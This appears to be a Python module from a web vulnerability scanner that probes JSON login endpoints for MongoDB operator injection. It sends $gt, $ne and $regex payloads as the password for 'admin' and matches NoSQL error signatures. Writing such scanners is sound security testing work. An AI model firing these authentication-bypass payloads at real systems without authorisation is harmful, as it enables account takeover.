"""SentinelX module: NoSQL injection.

Techniques: MongoDB operator injection in JSON bodies ($gt/$ne/$regex),
error-based detection via NoSQL error signatures. All via real HTTP.
"""

from __future__ import annotations

import json
import re
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
from sentinelx.core.diff import is_significant_change

NOSQL_ERROR_RES = [
    (re.compile(r"MongoError|mongodb.*error", re.I), "MongoDB"),
    (re.compile(r"unknown operator|BadValue", re.I), "MongoDB"),
    (re.compile(r"CouchDB|illegal_database_name", re.I), "CouchDB"),
]

# Operator injection payloads for JSON login bodies
OPERATOR_PAYLOADS = [
    ({"$gt": ""}, "mongodb-gt-bypass"),
    ({"$ne": None}, "mongodb-ne-bypass"),
    ({"$regex": ".*"}, "mongodb-regex-bypass"),
]

REMEDIATION_NOSQL = (
    "Never pass user input directly into NoSQL query operators. Validate that "
    "username/password are strings (reject objects/dicts). Use an allowlist of "
    "expected fields and sanitize input server-side.")


def _evidence(method, url, req_headers, body_sent, resp) -> Evidence:
    rbody = resp.content if resp else b""
    return Evidence(
        request_raw=raw_request(method, url, req_headers, body_sent),
        response_raw=raw_response(resp.status_code if resp else 0,
                                  dict(resp.headers) if resp else {}, rbody),
        proof="",
    )


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    headers = {"User-Agent": config.user_agent,
               "Content-Type": "application/json"}

    # baseline: normal JSON login attempt
    base_body = json.dumps({"username": "sx_no_user", "password": "sx_no_pass"})
    bresp = await client.post(url, data=base_body.encode(), headers=headers,
                              dedupe=False)
    if not bresp:
        return findings
    # only test endpoints that look like JSON APIs (avoid spamming forms)
    ct = bresp.headers.get("content-type", "")
    if bresp.status_code == 415 or "html" in ct and bresp.status_code not in (200, 401, 403):
        pass  # still try; some APIs return HTML errors
    base_text, base_status = bresp.text, bresp.status_code

    for op_dict, label in OPERATOR_PAYLOADS:
        body = json.dumps({"username": "admin", "password": op_dict})
        resp = await client.post(url, data=body.encode(), headers=headers,
                                 dedupe=False)
        if not resp:
            continue
        # signal 1: auth bypass — operator login succeeds where plain fails
        bypass = False
        try:
            j = json.loads(resp.text)
            if isinstance(j, dict) and j.get("ok") is True:
                # confirm the baseline (wrong password) does NOT succeed
                if '"ok": true' not in base_text.lower().replace(" ", ""):
                    bypass = True
        except Exception:
            pass
        # signal 2: NoSQL error signature
        db_err = None
        for rx, db in NOSQL_ERROR_RES:
            if rx.search(resp.text) and not rx.search(base_text):
                db_err = db
                break
        if bypass or db_err:
            sig, reason = is_significant_change(base_text, resp.text,
                                                base_status, resp.status_code)
            if bypass or db_err or sig:
                ev = _evidence("POST", url, headers, body.encode(), resp)
                ev.proof = (f"NoSQL operator injection ({label}): "
                            f"{'authentication bypassed' if bypass else ''}"
                            f"{' DB error: ' + db_err if db_err else ''}")
                findings.append(Finding(
                    type="NoSQL Injection", subtype=label,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.90 if bypass else 0.80, url=url, method="POST",
                    param="password", payload=json.dumps(op_dict), evidence=ev,
                    cwe="CWE-943", owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_NOSQL,
                    references=["https://owasp.org/www-community/attacks/NoSQL_Injection"],
                ))
                break
    return findings
